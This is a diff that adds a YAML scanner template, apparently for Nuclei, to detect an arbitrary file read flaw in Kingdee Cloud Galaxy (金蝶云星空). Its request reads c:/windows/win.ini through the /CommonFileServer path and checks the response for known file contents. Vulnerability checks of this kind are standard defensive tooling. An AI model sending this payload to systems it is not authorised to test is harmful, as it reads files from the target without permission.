@@ -1,0 +1,20 @@
+id: poc-yaml-jindie-yunxingkong-arbitrary-file-read
+info:
+  name: Arbitrary File Read in 金蝶云星空
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: arbitrary-file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/CommonFileServer/c:/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        part: body
